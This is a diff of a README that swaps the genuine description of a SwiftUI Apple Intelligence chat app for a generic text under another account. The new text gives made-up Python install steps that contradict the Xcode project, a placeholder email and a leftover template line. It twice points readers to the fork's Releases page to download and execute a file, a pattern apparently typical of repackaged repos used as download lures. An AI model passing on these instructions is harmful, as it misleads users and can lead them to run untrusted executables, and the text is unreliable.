@@ -1,57 +1,126 @@
-# Apple Intelligence Chat
+# Apple Intelligence Chat 🍏🤖
 
-A SwiftUI app that allows you to chat with Apple Intelligence using the new [Foundation Models Framework](https://developer.apple.com/documentation/foundationmodels) and Liquid Glass UI on iOS 26+.
+Welcome to the **Apple Intelligence Chat** repository! This project allows you to engage in conversations with Apple Intelligence using the Foundation Models Framework. Whether you're a developer, researcher, or just curious about AI, this tool provides a unique way to explore the capabilities of Apple's AI technologies.
 
-![image](https://github.com/user-attachments/assets/6305de96-2c6a-4eaa-99ff-a923ad6be368)
+![Apple Intelligence](https://img.shields.io/badge/Apple%20Intelligence-Chat-blue?style=flat-square)
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
+
+## Introduction
+
+Apple Intelligence is a powerful AI framework designed to enhance user interactions through natural language processing. This project leverages that framework, enabling users to chat with an AI modeled after Apple's own intelligence systems. 
+
+With this repository, you can explore various features, test different scenarios, and see how AI can assist in everyday tasks. 
 
 ## Features
 
-- **Offline AI Chat**: Chat with the Apple Intelligence model directly on device
-- **Streaming Responses**: Real-time streaming text generation with haptic feedback
-- **Modern Glass UI**: Liquid Glass UI design with interactive glass effects
-- **Customizable Settings**: Adjust temperature, system instructions, and streaming preferences
+- **Natural Language Understanding**: Engage in fluid conversations with the AI.
+- **Customizable Responses**: Tailor the AI's responses to fit specific contexts or user needs.
+- **Foundation Models Framework**: Built on robust models that ensure high performance and accuracy.
+- **Easy Integration**: Simple setup process to get you started quickly.
+- **Cross-Platform Compatibility**: Works on various operating systems and devices.
 
-## Requirements
+## Getting Started
 
-- iOS/iPadOS/MacOS 26.0+
-- Device with Apple Intelligence support
-- Xcode 26.0 beta or newer
+To get started with the Apple Intelligence Chat, follow these steps:
+
+1. **Clone the Repository**: Use Git to clone the repository to your local machine.
+2. **Install Dependencies**: Ensure you have the required libraries and frameworks installed.
+3. **Run the Application**: Launch the application to start chatting with the AI.
 
 ## Installation
 
-1. Clone the repository:
+### Prerequisites
 
-```bash
-git clone https://github.com/PallavAg/Apple-Intelligence-Chat.git
-```
+Before you begin, ensure you have the following installed:
 
-2. Open the project in Xcode:
+- Python 3.x
+- pip (Python package installer)
+- Git
 
-```bash
-cd Apple-Intelligence-Chat
-open "Apple Intelligence Chat.xcodeproj"
-```
+### Steps to Install
 
-3. Select a development team, then run on a compatible device or simulator
+1. **Clone the Repository**:
+
+   ```bash
+   git clone https://github.com/zanis31/Apple-Intelligence-Chat.git
+   cd Apple-Intelligence-Chat
+   ```
+
+2. **Install Required Packages**:
+
+   Use pip to install the necessary dependencies.
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+3. **Download the Release**:
+
+   Visit the [Releases section](https://github.com/zanis31/Apple-Intelligence-Chat/releases) to download the latest version. Follow the instructions to execute the downloaded file.
 
 ## Usage
 
-1. Ensure Apple Intelligence is enabled in Settings
-2. Launch the app
-3. Start chatting with the AI assistant
-4. Customize behavior in Settings:
-   - Toggle streaming responses
-   - Adjust temperature (0.0 - 2.0)
-   - Modify system instructions
+Once installed, you can start using the Apple Intelligence Chat. 
 
-## License
+1. **Launch the Application**:
 
-This project is available under the [MIT License](LICENSE).
+   Run the main script to initiate the chat.
+
+   ```bash
+   python main.py
+   ```
+
+2. **Start Chatting**:
+
+   You can type your questions or commands in the chat window. The AI will respond based on its training and the context of the conversation.
+
+3. **Explore Features**:
+
+   Test various functionalities, such as customizing responses or changing settings.
 
 ## Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+We welcome contributions from the community. If you want to help improve the Apple Intelligence Chat, please follow these steps:
 
-## Acknowledgments
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Create a Branch**: Use a descriptive name for your branch.
+3. **Make Your Changes**: Implement your features or fixes.
+4. **Submit a Pull Request**: Share your changes with the community.
 
-Built with Apple's Foundation Models Framework and Liquid Glass UI for iOS 26.
+Please ensure that your code follows the project's style guidelines and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: your.email@example.com
+- **GitHub**: [zanis31](https://github.com/zanis31)
+
+## Releases
+
+To stay updated with the latest versions, visit the [Releases section](https://github.com/zanis31/Apple-Intelligence-Chat/releases). Here, you can download the latest files and follow the instructions for execution.
+
+## Conclusion
+
+Thank you for checking out the Apple Intelligence Chat repository. We hope you find it useful and engaging. Enjoy chatting with AI and exploring the possibilities it offers!
+
+![Apple Intelligence Chat](https://img.shields.io/badge/Explore%20AI%20Today-orange?style=flat-square)
+
+---
+
+Feel free to customize this README as needed to fit your project. Happy coding!
